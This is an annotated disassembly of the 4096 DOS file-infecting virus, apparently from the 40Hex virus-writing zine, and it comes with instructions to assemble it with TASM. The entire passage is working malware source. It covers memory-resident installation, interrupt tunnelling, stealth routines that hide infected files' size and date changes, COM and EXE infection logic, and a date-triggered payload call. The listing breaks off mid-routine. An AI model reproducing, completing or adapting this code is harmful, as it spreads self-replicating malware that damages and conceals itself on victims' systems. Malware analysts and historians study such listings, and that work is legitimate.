﻿


_4096           segment byte public
                assume  cs:_4096, ds:_4096

; 4096 Virus
; Disassembly done by Dark Angel of Phalcon/Skism for 40Hex Issue #9
; Assemble with TASM; the resultant file size is 4081 bytes

                org     0
startvirus:
                db      0
                jmp     installvirus
oldheader: ; original 1Ch bytes of the carrier file
                retn
                db      75h,02,44h,15h,46h,20h
                db      'Copyright Bourb%}i, I'
endoldheader:
EXEflag         db       00h
                db      0FEh, 3Ah

int1: ; locate the BIOS or DOS entry point for int 13h and int 21h
                push    bp                      ; set up stack frame
                mov     bp,sp
                push    ax
                cmp     word ptr [bp+4],0C000h  ; in BIOS?
                jnb     foundorigint            ; nope, haven't found it
                mov     ax,cs:DOSsegment        ; in DOS?
                cmp     [bp+4],ax
                jbe     foundorigint
exitint1:
                pop     ax
                pop     bp
                iret
foundorigint:
                cmp     byte ptr cs:tracemode,1
                jz      tracemode1
                mov     ax,[bp+4]               ; save segment of entry point
                mov     word ptr cs:origints+2,ax
                mov     ax,[bp+2]               ; save offset of entry point
                mov     word ptr cs:origints,ax
                jb      finishint1
                pop     ax
                pop     bp
                mov     ss,cs:savess            ; restore the stack to its
                mov     sp,cs:savesp            ; original state
                mov     al,cs:saveIMR           ; Restore IMR
                out     21h,al                  ; (enable interrupts)
                jmp     setvirusints
finishint1:
                and     word ptr [bp+6],0FEFFh  ; turn off trap flag
                mov     al,cs:saveIMR           ; and restore IMR
                out     21h,al
                jmp     short exitint1
tracemode1:
                dec     byte ptr cs:instructionstotrace
                jnz     exitint1
                and     word ptr [bp+6],0FEFFh  ; turn off trap flag
                call    saveregs
                call    swapvirint21            ; restore original int
                lds     dx,dword ptr cs:oldint1 ; 21h & int 1 handlers
                mov     al,1
                call    setvect
                call    restoreregs
                jmp     short finishint1

getint:
                push    ds
                push    si
                xor     si,si                   ; clear si
                mov     ds,si                   ; ds->interrupt table
                xor     ah,ah                   ; cbw would be better!?
                mov     si,ax
                shl     si,1                    ; convert int # to offset in
                shl     si,1                    ; interrupt table (int # x 4)
                mov     bx,[si]                 ; es:bx = interrupt vector
                mov     es,[si+2]               ; get old interrupt vector
                                                ; save 3 bytes if use les bx,[si]
                pop     si
                pop     ds
                retn

installvirus:
                mov     word ptr cs:stackptr,offset topstack
                mov     cs:initialax,ax         ; save initial value for ax
                mov     ah,30h                  ; Get DOS version
                int     21h

                mov     cs:DOSversion,al        ; Save DOS version
                mov     cs:carrierPSP,ds        ; Save PSP segment
                mov     ah,52h                  ; Get list of lists
                int     21h

                mov     ax,es:[bx-2]            ; segment of first MCB
                mov     cs:DOSsegment,ax        ; save it for use in int 1
                mov     es,ax                   ; es = segment first MCB
                mov     ax,es:[1]               ; Get owner of first MCB
                mov     cs:ownerfirstMCB,ax     ; save it
                push    cs
                pop     ds
                mov     al,1                    ; get single step vector
                call    getint
                mov     word ptr ds:oldint1,bx  ; save it for later
                mov     word ptr ds:oldint1+2,es; restoration
                mov     al,21h                  ; get int 21h vector
                call    getint
                mov     word ptr ds:origints,bx
                mov     word ptr ds:origints+2,es
                mov     byte ptr ds:tracemode,0 ; regular trace mode on
                mov     dx,offset int1          ; set new int 1 handler
                mov     al,1
                call    setvect
                pushf
                pop     ax
                or      ax,100h                 ; turn on trap flag
                push    ax
                in      al,21h                  ; Get old IMR
                mov     ds:saveIMR,al
                mov     al,0FFh                 ; disable all interrupts
                out     21h,al
                popf
                mov     ah,52h                  ; Get list of lists
                pushf                           ; (for tracing purposes)
                call    dword ptr ds:origints   ; perform the tunnelling
                pushf
                pop     ax
                and     ax,0FEFFh               ; turn off trap flag
                push    ax
                popf
                mov     al,ds:saveIMR           ; reenable interrupts
                out     21h,al
                push    ds
                lds     dx,dword ptr ds:oldint1
                mov     al,1                    ; restore int 1 to the
                call    setvect                 ; original handler
                pop     ds
                les     di,dword ptr ds:origints; set up int 21h handlers
                mov     word ptr ds:oldint21,di
                mov     word ptr ds:oldint21+2,es
                mov     byte ptr ds:jmpfarptr,0EAh ; jmp far ptr
                mov     word ptr ds:int21store,offset otherint21
                mov     word ptr ds:int21store+2,cs
                call    swapvirint21            ; activate virus in memory
                mov     ax,4B00h
                mov     ds:checkres,ah          ; set resident flag to a
                                                ; dummy value
                mov     dx,offset EXEflag+1     ; save EXE flag
                push    word ptr ds:EXEflag
                int     21h                     ; installation check
                                                ; returns checkres=0 if
                                                ; installed

                pop     word ptr ds:EXEflag     ; restore EXE flag
                add     word ptr es:[di-4],9
                nop                             ; !?
                mov     es,ds:carrierPSP        ; restore ES and DS to their
                mov     ds,ds:carrierPSP        ; original values
                sub     word ptr ds:[2],(topstack/10h)+1
                                                ; alter top of memory in PSP
                mov     bp,ds:[2]               ; get segment
                mov     dx,ds
                sub     bp,dx
                mov     ah,4Ah                  ; Find total available memory
                mov     bx,0FFFFh
                int     21h

                mov     ah,4Ah                  ; Allocate all available memory
                int     21h

                dec     dx                      ; go to MCB of virus memory
                mov     ds,dx
                cmp     byte ptr ds:[0],'Z'     ; is it the last block?
                je      carrierislastMCB
                dec     byte ptr cs:checkres    ; mark need to install virus
carrierislastMCB:
                cmp     byte ptr cs:checkres,0  ; need to install?
                je      playwithMCBs            ; nope, go play with MCBs
                mov     byte ptr ds:[0],'M'     ; mark not end of chain
playwithMCBs:
                mov     ax,ds:[3]               ; get memory size controlled
                mov     bx,ax                   ; by the MCB
                sub     ax,(topstack/10h)+1     ; calculate new size
                add     dx,ax                   ; find high memory segment
                mov     ds:[3],ax               ; put new size in MCB
                inc     dx                      ; one more for the MCB
                mov     es,dx                   ; es->high memory MCB
                mov     byte ptr es:[0],'Z'     ; mark end of chain
                push    word ptr cs:ownerfirstMCB ; get DOS PSP ID
                pop     word ptr es:[1]         ; make it the owner
                mov     word ptr es:[3],160h    ; fill in the size field
                inc     dx
                mov     es,dx                   ; es->high memory area
                push    cs
                pop     ds
                mov     cx,(topstack/2)         ; zopy 0-1600h to high memory
                mov     si,offset topstack-2
                mov     di,si
                std                             ; zopy backwards
                rep     movsw
                cld
                push    es                      ; set up stack for jmp into
                mov     ax,offset highentry     ; virus code in high memory
                push    ax
                mov     es,cs:carrierPSP        ; save current PSP segment
                mov     ah,4Ah                  ; Alter memory allocation
                mov     bx,bp                   ; bx = paragraphs
                int     21h
                retf                            ; jmp to virus code in high
highentry:                                      ; memory
                call    swapvirint21
                mov     word ptr cs:int21store+2,cs
                call    swapvirint21
                push    cs
                pop     ds
                mov     byte ptr ds:handlesleft,14h ; reset free handles count
                push    cs
                pop     es
                mov     di,offset handletable
                mov     cx,14h
                xor     ax,ax                   ; clear handle table
                rep     stosw
                mov     ds:hideclustercountchange,al ; clear the flag
                mov     ax,ds:carrierPSP
                mov     es,ax                   ; es->PSP
                lds     dx,dword ptr es:[0Ah]   ; get terminate vector (why?)
                mov     ds,ax                   ; ds->PSP
                add     ax,10h                  ; adjust for PSP
                add     word ptr cs:oldheader+16h,ax ; adjust jmp location
                cmp     byte ptr cs:EXEflag,0   ; for PSP
                jne     returntoEXE
returntoCOM:
                sti
                mov     ax,word ptr cs:oldheader; restore first 6 bytes of the
                mov     ds:[100h],ax            ; COM file
                mov     ax,word ptr cs:oldheader+2
                mov     ds:[102h],ax
                mov     ax,word ptr cs:oldheader+4
                mov     ds:[104h],ax
                push    word ptr cs:carrierPSP  ; Segment of carrier file's
                mov     ax,100h                 ; PSP
                push    ax
                mov     ax,cs:initialax         ; restore orig. value of ax
                retf                            ; return to original COM file

returntoEXE:
                add     word ptr cs:oldheader+0eh,ax
                mov     ax,cs:initialax         ; Restore ax
                mov     ss,word ptr cs:oldheader+0eh ; Restore stack to
                mov     sp,word ptr cs:oldheader+10h ; original value
                sti
                jmp     dword ptr cs:oldheader+14h ; jmp to original cs:IP
                                                ; entry point
entervirus:
                cmp     sp,100h                 ; COM file?
                ja      dont_resetstack         ; if so, skip this
                xor     sp,sp                   ; new stack
dont_resetstack:
                mov     bp,ax
                call    next                    ; calculate relativeness
next:
                pop     cx
                sub     cx,offset next          ; cx = delta offset
                mov     ax,cs                   ; ax = segment
                mov     bx,10h                  ; convert to offset
                mul     bx
                add     ax,cx
                adc     dx,0
                div     bx                      ; convert to seg:off
                push    ax                      ; set up stack for jmp
                mov     ax,offset installvirus  ; to installvirus
                push    ax
                mov     ax,bp
                retf                            ; go to installvirus

int21commands:
                db      30h     ; get DOS version
                dw      offset getDOSversion
                db      23h     ; FCB get file size
                dw      offset FCBgetfilesize
                db      37h     ; get device info
                dw      offset get_device_info
                db      4Bh     ; execute
                dw      offset execute
                db      3Ch     ; create file w/ handle
                dw      offset createhandle
                db      3Dh     ; open file
                dw      offset openhandle
                db      3Eh     ; close file
                dw      offset handleclosefile
                db      0Fh     ; FCB open file
                dw      offset FCBopenfile
                db      14h     ; sequential FCB read
                dw      offset sequentialFCBread
                db      21h     ; random FCB read
                dw      offset randomFCBread
                db      27h     ; random FCB block read
                dw      offset randomFCBblockread
                db      11h     ; FCB find first
                dw      offset FCBfindfirstnext
                db      12h     ; FCB find next
                dw      offset FCBfindfirstnext
                db      4Eh     ; filename find first
                dw      offset filenamefindfirstnext
                db      4Fh     ; filename find next
                dw      offset filenamefindfirstnext
                db      3Fh     ; read
                dw      offset handleread
                db      40h     ; write
                dw      offset handlewrite
                db      42h     ; move file pointer
                dw      offset handlemovefilepointer
                db      57h     ; get/set file time/date
                dw      offset getsetfiletimedate
                db      48h     ; allocate memory
                dw      offset allocatememory
endcommands:

otherint21:
                cmp     ax,4B00h                ; execute?
                jnz     notexecute
                mov     cs:checkres,al          ; clear the resident flag
notexecute:
                push    bp                      ; set up stack frame
                mov     bp,sp
                push    [bp+6]                  ; push old flags
                pop     cs:int21flags           ; and put in variable
                pop     bp                      ; why?
                push    bp                      ; why?
                mov     bp,sp                   ; set up new stack frame
                call    saveregs
                call    swapvirint21            ; reenable DOS int 21h handler
                call    disableBREAK
                call    restoreregs
                call    _pushall
                push    bx
                mov     bx,offset int21commands ; bx->command table
scanforcommand:
                cmp     ah,cs:[bx]              ; scan for the function
                jne     findnextcommand         ; code/subroutine combination
                mov     bx,cs:[bx+1]
                xchg    bx,[bp-14h]
                cld
                retn
findnextcommand:
                add     bx,3                    ; go to next command
                cmp     bx,offset endcommands   ; in the table until
                jb      scanforcommand          ; there are no more
                pop     bx
exitotherint21:
                call    restoreBREAK
                in      al,21h                  ; save IMR
                mov     cs:saveIMR,al
                mov     al,0FFh                 ; disable all interrupts
                out     21h,al
                mov     byte ptr cs:instructionstotrace,4 ; trace into
                mov     byte ptr cs:tracemode,1           ; oldint21
                call    replaceint1             ; set virus int 1 handler
                call    _popall
                push    ax
                mov     ax,cs:int21flags        ; get the flags
                or      ax,100h                 ; turn on the trap flag
                push    ax                      ; and set it in motion
                popf
                pop     ax
                pop     bp
                jmp     dword ptr cs:oldint21   ; chain back to original int
                                                ; 21h handler -- do not return

exitint21:
                call    saveregs
                call    restoreBREAK
                call    swapvirint21
                call    restoreregs
                pop     bp
                push    bp                      ; set up stack frame
                mov     bp,sp
                push    word ptr cs:int21flags  ; get the flags and put
                pop     word ptr [bp+6]         ; them on the stack for
                pop     bp                      ; the iret
                iret

FCBfindfirstnext:
                call    _popall
                call    callint21
                or      al,al                   ; Found any files?
                jnz     exitint21               ; guess not
                call    _pushall
                call    getdisktransferaddress
                mov     al,0
                cmp     byte ptr [bx],0FFh      ; Extended FCB?
                jne     findfirstnextnoextendedFCB
                mov     al,[bx+6]
                add     bx,7                    ; convert to normal FCB
findfirstnextnoextendedFCB:
                and     cs:hide_size,al
                test    byte ptr [bx+1Ah],80h   ; check year bit for virus
                jz      _popall_then_exitint21  ; infection tag. exit if so
                sub     byte ptr [bx+1Ah],0C8h  ; alter file date
                cmp     byte ptr cs:hide_size,0
                jne     _popall_then_exitint21
                sub     word ptr [bx+1Dh],1000h ; hide file size
                sbb     word ptr [bx+1Fh],0
_popall_then_exitint21:
                call    _popall
                jmp     short exitint21

FCBopenfile:
                call    _popall
                call    callint21               ; chain to original int 21h
                call    _pushall
                or      al,al                   ; 0 = success
                jnz     _popall_then_exitint21
                mov     bx,dx
                test    byte ptr [bx+15h],80h   ; check if infected yet
                jz      _popall_then_exitint21
                sub     byte ptr [bx+15h],0C8h  ; restore date
                sub     word ptr [bx+10h],1000h ; and hide file size
                sbb     byte ptr [bx+12h],0
                jmp     short _popall_then_exitint21

randomFCBblockread:
                jcxz    go_exitotherint21       ; reading any blocks?

randomFCBread:
                mov     bx,dx
                mov     si,[bx+21h]             ; check if reading first
                or      si,[bx+23h]             ; bytes
                jnz     go_exitotherint21
                jmp     short continueFCBread

sequentialFCBread:
                mov     bx,dx
                mov     ax,[bx+0Ch]             ; check if reading first
                or      al,[bx+20h]             ; bytes
                jnz     go_exitotherint21
continueFCBread:
                call    checkFCBokinfect
                jnc     continuecontinueFCBread
go_exitotherint21:
                jmp     exitotherint21
continuecontinueFCBread:
                call    _popall
                call    _pushall
                call    callint21               ; chain to original handler
                mov     [bp-4],ax               ; set the return codes
                mov     [bp-8],cx               ; properly
                push    ds                      ; save FCB pointer
                push    dx
                call    getdisktransferaddress
                cmp     word ptr [bx+14h],1     ; check for EXE infection
                je      FCBreadinfectedfile     ; (IP = 1)
                mov     ax,[bx]                 ; check for COM infection
                add     ax,[bx+2]               ; (checksum = 0)
                add     ax,[bx+4]
                jz      FCBreadinfectedfile
                add     sp,4                    ; no infection, no stealth
                jmp     short _popall_then_exitint21 ; needed
FCBreadinfectedfile:
                pop     dx                      ; restore address of the FCB
                pop     ds
                mov     si,dx
                push    cs
                pop     es
                mov     di,offset tempFCB       ; copy FCB to temporary one
                mov     cx,25h
                rep     movsb
                mov     di,offset tempFCB
                push    cs
                pop     ds
                mov     ax,[di+10h]             ; get old file size
                mov     dx,[di+12h]
                add     ax,100Fh                ; increase by virus size
                adc     dx,0                    ; and round to the nearest
                and     ax,0FFF0h               ; paragraph
                mov     [di+10h],ax             ; insert new file size
                mov     [di+12h],dx
                sub     ax,0FFCh
                sbb     dx,0
                mov     [di+21h],ax             ; set new random record #
                mov     [di+23h],dx
                mov     word ptr [di+0Eh],1     ; record size = 1
                mov     cx,1Ch
                mov     dx,di
                mov     ah,27h                  ; random block read 1Ch bytes
                call    callint21
                jmp     _popall_then_exitint21

FCBgetfilesize:
                push    cs
                pop     es
                mov     si,dx
                mov     di,offset tempFCB       ; copy FCB to temp buffer
                mov     cx,0025h
                repz    movsb
                push    ds
                push    dx
                push    cs
                pop     ds
                mov     dx,offset tempFCB
                mov     ah,0Fh                  ; FCB open file
                call    callint21
                mov     ah,10h                  ; FCB close file
                call    callint21
                test    byte ptr [tempFCB+15h],80h ; check date bit
                pop     si
                pop     ds
                jz      will_exitotherint21     ; exit if not infected
                les     bx,dword ptr cs:[tempFCB+10h] ; get filesize
                mov     ax,es
                sub     bx,1000h                ; hide increase
                sbb     ax,0
                xor     dx,dx
                mov     cx,word ptr cs:[tempFCB+0eh] ; get record size
                dec     cx
                add     bx,cx
                adc     ax,0
                inc     cx
                div     cx
                mov     [si+23h],ax             ; fix random access record #
                xchg    dx,ax
                xchg    bx,ax
                div     cx
                mov     [si+21h],ax             ; fix random access record #
                jmp     _popall_then_exitint21

filenamefindfirstnext:
                and     word ptr cs:int21flags,-2 ; turn off trap flag
                call    _popall
                call    callint21
                call    _pushall
                jnb     filenamefffnOK          ; continue if a file is found
                or      word ptr cs:int21flags,1
                jmp     _popall_then_exitint21

filenamefffnOK:
                call    getdisktransferaddress
                test    byte ptr [bx+19h],80h   ; Check high bit of date
                jnz     filenamefffnfileinfected; Bit set if infected
                jmp     _popall_then_exitint21
filenamefffnfileinfected:
                sub     word ptr [bx+1Ah],1000h ; hide file length increase
                sbb     word ptr [bx+1Ch],0
                sub     byte ptr [bx+19h],0C8h  ; and date change
                jmp     _popall_then_exitint21

createhandle:
                push    cx
                and     cx,7                    ; mask the attributes
                cmp     cx,7                    ; r/o, hidden, & system?
                je      exit_create_handle
                pop     cx
                call    replaceint13and24
                call    callint21               ; chain to original int 21h
                call    restoreint13and24
                pushf
                cmp     byte ptr cs:errorflag,0 ; check if any errors yet
                je      no_errors_createhandle
                popf
will_exitotherint21:
                jmp     exitotherint21
no_errors_createhandle:
                popf
                jc      other_error_createhandle; exit on error
                mov     bx,ax                   ; move handle to bx
                mov     ah,3Eh                  ; Close file
                call    callint21
                jmp     short openhandle
other_error_createhandle:
                or      byte ptr cs:int21flags,1; turn on the trap flag
                mov     [bp-4],ax               ; set the return code properly
                jmp     _popall_then_exitint21
exit_create_handle:
                pop     cx
                jmp     exitotherint21

openhandle:
                call    getcurrentPSP
                call    checkdsdxokinfect
                jc      jmp_exitotherint21
                cmp     byte ptr cs:handlesleft,0 ; make sure there is a free
                je      jmp_exitotherint21        ; entry in the table
                call    setup_infection         ; open the file
                cmp     bx,0FFFFh               ; error?
                je      jmp_exitotherint21      ; if so, exit
                dec     byte ptr cs:handlesleft
                push    cs
                pop     es
                mov     di,offset handletable
                mov     cx,14h
                xor     ax,ax                   ; find end of the table
                repne   scasw
                mov     ax,cs:currentPSP        ; put the PSP value and the
                mov     es:[di-2],ax            ; handle # in the table
                mov     es:[di+26h],bx
                mov     [bp-4],bx               ; put handle # in return code
handleopenclose_exit:
                and     byte ptr cs:int21flags,0FEh ; turn off the trap flag
                jmp     _popall_then_exitint21
jmp_exitotherint21:
                jmp     exitotherint21

handleclosefile:
                push    cs
                pop     es
                call    getcurrentPSP
                mov     di,offset handletable
                mov     cx,14h                  ; 14h entries max
                mov     ax,cs:currentPSP        ; search for calling PSP
scanhandle_close:
                repne   scasw
                jnz     handlenotfound          ; handle not trapped
                cmp     bx,es:[di+26h]          ; does the handle correspond?
                jne     scanhandle_close        ; if not, find another handle
                mov     word ptr es:[di-2],0    ; otherwise, clear handle
                call    infect_file
                inc     byte ptr cs:handlesleft ; fix handles left counter
                jmp     short handleopenclose_exit ; and exit
handlenotfound:
                jmp     exitotherint21

getdisktransferaddress:
                push    es
                mov     ah,2Fh                  ; Get disk transfer address
                call    callint21               ; to es:bx
                push    es
                pop     ds                      ; mov to ds:bx
                pop     es
                retn
execute:
                or      al,al                   ; load and execute?
                jz      loadexecute             ; yepper!
                jmp     checkloadnoexecute      ; otherwise check if
                                                ; load/no execute
loadexecute:
                push    ds                      ; save filename
                push    dx
                mov     word ptr cs:parmblock,bx; save parameter block and
                mov     word ptr cs:parmblock+2,es; move to ds:si
                lds     si,dword ptr cs:parmblock
                mov     di,offset copyparmblock ; copy the parameter block
                mov     cx,0Eh
                push    cs
                pop     es
                rep     movsb
                pop     si                      ; copy the filename
                pop     ds                      ; to the buffer
                mov     di,offset copyfilename
                mov     cx,50h
                rep     movsb
                mov     bx,0FFFFh
                call    allocate_memory         ; allocate available memory
                call    _popall
                pop     bp                      ; save the parameters
                pop     word ptr cs:saveoffset  ; on the stack
                pop     word ptr cs:savesegment
                pop     word ptr cs:int21flags
                mov     ax,4B01h                ; load/no execute
                push    cs                      ; ds:dx -> file name
                pop     es                      ; es:bx -> parameter block
                mov     bx,offset copyparmblock
                pushf                           ; perform interrupt 21h
                call    dword ptr cs:oldint21
                jnc     continue_loadexecute    ; continue if no error
                or      word ptr cs:int21flags,1; turn on trap flag
                push    word ptr cs:int21flags  ; if error
                push    word ptr cs:savesegment ; restore stack
                push    word ptr cs:saveoffset
                push    bp                      ; restore the stack frame
                mov     bp,sp                   ; and restore ES:BX to
                les     bx,dword ptr cs:parmblock ; point to the parameter
                jmp     exitint21               ; block
continue_loadexecute:
                call    getcurrentPSP
                push    cs
                pop     es
                mov     di,offset handletable   ; scan the handle table
                mov     cx,14h                  ; for the current PSP's
scanhandle_loadexecute:                         ; handles
                mov     ax,cs:currentPSP
                repne   scasw
                jnz     loadexecute_checkEXE
                mov     word ptr es:[di-2],0    ; clear entry in handle table
                inc     byte ptr cs:handlesleft ; fix handlesleft counter
                jmp     short scanhandle_loadexecute
loadexecute_checkEXE:
                lds     si,dword ptr cs:origcsip
                cmp     si,1                    ; Check if EXE infected
                jne     loadexecute_checkCOM
                mov     dx,word ptr ds:oldheader+16h ; get initial CS
                add     dx,10h                  ; adjust for PSP
                mov     ah,51h                  ; Get current PSP segment
                call    callint21
                add     dx,bx                   ;adjust for start load segment
                mov     word ptr cs:origcsip+2,dx
                push    word ptr ds:oldheader+14h       ; save old IP
                pop     word ptr cs:origcsip
                add     bx,10h                          ; adjust for the PSP
                add     bx,word ptr ds:oldheader+0Eh    ; add old SS
                mov     cs:origss,bx
                push    word ptr ds:oldheader+10h       ; old SP
                pop     word ptr cs:origsp
                jmp     short perform_loadexecute
loadexecute_checkCOM:
                mov     ax,[si]                 ; Check if COM infected
                add     ax,[si+2]
                add     ax,[si+4]
                jz      loadexecute_doCOM       ; exit if already infected
                push    cs                      ; otherwise check to see
                pop     ds                      ; if it is suitable for
                mov     dx,offset copyfilename  ; infection
                call    checkdsdxokinfect
                call    setup_infection
                inc     byte ptr cs:hideclustercountchange
                call    infect_file             ; infect the file
                dec     byte ptr cs:hideclustercountchange
perform_loadexecute:
                mov     ah,51h                  ; Get current PSP segment
                call    callint21
                call    saveregs
                call    restoreBREAK
                call    swapvirint21
                call    restoreregs
                mov     ds,bx                   ; ds = current PSP segment
                mov     es,bx                   ; es = current PSP segment
                push    word ptr cs:int21flags  ; restore stack parameters
                push    word ptr cs:savesegment
                push    word ptr cs:saveoffset
                pop     word ptr ds:[0Ah]       ; Set terminate address in PSP
                pop     word ptr ds:[0Ch]       ; to return address found on
                                                ; the stack
                                                ; (int 21h caller CS:IP)
                push    ds
                lds     dx,dword ptr ds:[0Ah]   ; Get terminate address in PSP
                mov     al,22h                  ; Set terminate address to it
                call    setvect
                pop     ds
                popf
                pop     ax
                mov     ss,cs:origss            ; restore the stack
                mov     sp,cs:origsp            ; and
                jmp     dword ptr cs:origcsip   ; perform the execute

loadexecute_doCOM:
                mov     bx,[si+1]               ; restore original COM file
                mov     ax,word ptr ds:[bx+si-261h]
                mov     [si],ax
                mov     ax,word ptr ds:[bx+si-25Fh]
                mov     [si+2],ax
                mov     ax,word ptr ds:[bx+si-25Dh]
                mov     [si+4],ax
                jmp     short perform_loadexecute
checkloadnoexecute:
                cmp     al,1
                je      loadnoexecute
                jmp     exitotherint21
loadnoexecute:
                or      word ptr cs:int21flags,1; turn on trap flag
                mov     word ptr cs:parmblock,bx; save pointer to parameter
                mov     word ptr cs:parmblock+2,es ; block
                call    _popall
                call    callint21               ; chain to int 21h
                call    _pushall
                les     bx,dword ptr cs:parmblock ; restore pointer to
                                                ; parameter block
                lds     si,dword ptr es:[bx+12h]; get cs:ip on execute return
                jc      exit_loadnoexecute
                and     byte ptr cs:int21flags,0FEh ; turn off trap flag
                cmp     si,1                    ; check for EXE infection
                je      loadnoexecute_EXE_already_infected
                                                ; infected if initial IP = 1
                mov     ax,[si]                 ; check for COM infection
                add     ax,[si+2]               ; infected if checksum = 0
                add     ax,[si+4]
                jnz     perform_the_execute
                mov     bx,[si+1]               ; get jmp location
                mov     ax,ds:[bx+si-261h]      ; restore original COM file
                mov     [si],ax
                mov     ax,ds:[bx+si-25Fh]
                mov     [si+2],ax
                mov     ax,ds:[bx+si-25Dh]
                mov     [si+4],ax
                jmp     short perform_the_execute
loadnoexecute_EXE_already_infected:
                mov     dx,word ptr ds:oldheader+16h ; get entry CS:IP
                call    getcurrentPSP
                mov     cx,cs:currentPSP
                add     cx,10h                  ; adjust for PSP
                add     dx,cx
                mov     es:[bx+14h],dx          ; alter the entry point CS
                mov     ax,word ptr ds:oldheader+14h
                mov     es:[bx+12h],ax
                mov     ax,word ptr ds:oldheader+0Eh ; alter stack
                add     ax,cx
                mov     es:[bx+10h],ax
                mov     ax,word ptr ds:oldheader+10h
                mov     es:[bx+0Eh],ax
perform_the_execute:
                call    getcurrentPSP
                mov     ds,cs:currentPSP
                mov     ax,[bp+2]               ; restore length as held in
                mov     word ptr ds:oldheader+6,ax
                mov     ax,[bp+4]               ; the EXE header
                mov     word ptr ds:oldheader+8,ax
exit_loadnoexecute:
                jmp     _popall_then_exitint21

getDOSversion:
                mov     byte ptr cs:hide_size,0
                mov     ah,2Ah                  ; Get date
                call    callint21
                cmp     dx,916h                 ; September 22?
                jb      exitDOSversion          ; leave if not
                call    writebootblock          ; this is broken
exitDOSversion:
                jmp     exitotherint21

infect_file:
                call    replaceint13and24
                call    findnextparagraphboundary
                mov     byte ptr ds:EXEflag,1   ; assume is an EXE file
                cmp     word ptr ds:readbuffer,'ZM' ; check here for regular
                je      clearlyisanEXE              ; EXE header
                cmp     word ptr ds:readbuffer,'MZ' ; check here for alternate
                je      clearlyisanEXE              ; EXE header
                dec     byte ptr ds:EXEflag         ; if neither, assume is a
                jz      try_infect_com              ; COM file
clearlyisanEXE:
                mov     ax,ds:lengthinpages     ; get file size in pages
                shl     cx,1                    ; and convert it to
                mul     cx                      ; bytes
                add     ax,200h                 ; add 512 bytes
                cmp     ax,si
                jb      go_exit_infect_file
                mov     ax,ds:minmemory         ; make sure min and max memory
                or      ax,ds:maxmemory         ; are not both zero
                jz      go_exit_infect_file
                mov     ax,ds:filesizelow       ; get filesize in dx:ax
                mov     dx,ds:filesizehigh
                mov     cx,200h                 ; convert to pages
                div     cx
                or      dx,dx                   ; filesize multiple of 512?
                jz      filesizemultiple512     ; then don't increm
